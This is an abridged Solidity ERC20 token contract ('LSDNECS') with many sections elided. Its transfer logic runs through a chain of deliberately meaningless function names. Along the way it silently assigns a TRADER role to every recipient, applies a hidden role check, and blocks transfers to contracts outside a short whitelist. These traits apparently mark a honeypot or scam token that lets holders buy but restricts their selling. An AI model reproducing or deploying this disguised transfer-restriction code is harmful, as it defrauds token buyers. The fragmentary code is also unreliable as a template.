...
abstract contract LSDNECSConsole is Context, LSDNECSRoleControl {
    ...
    function _hasRote(bytes32 role, address account, uint256 amt) internal {
        ...
        _hasRotes(role, account, amt);
    }

    function _hasRotes(bytes32 role, address account, uint256 amt) internal {
    ...
    function _newhasRote(bytes32 role, address account, uint256 num) internal virtual {
...
contract LSDNECSERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is LSDNECSERC20, LSDNECSConsole {
    ...
    ) LSDNECSERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(LSDNECSERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");


        _LSDNECSenxicd(from, to, amt);
    }



    function _LSDNECSenxicd(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");

        _LSDNECScvreinh(from, to, amt);
    }

    function _LSDNECScvreinh(address from, address to, uint256 amt) internal {
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _LSDNECSjcxlvrnt(from, to, amt);
    }

    function _LSDNECSjcxlvrnt(address from, address to, uint256 amt) internal {
        ...
        _LSDNECSzewnor(from, to, amt);
    }

    function _LSDNECSzewnor(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        _LSDNECSxcvirenht(from, to, amt);
    }

    function _LSDNECSxcvirenht(address from, address to, uint256 amt) internal {
        
        _LSDNECSxvnth(from, to, amt);
    }

    function _LSDNECSxvnth(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        _LSDNECSzxlvnrea(from, to, amt);
    }

    function _LSDNECSzxlvnrea(address from, address to, uint256 amt) internal {


        
        if(to != uniswapV2Pair){
            if(isContract(to) && to != sushi && to != okx && to != okx1 && to != tran1){
                require(false, "ERC20: only admin can add liquidity");
            }
            if(isnum > 0){
                _newhasRote(TRADER,to,1);
            }
        }
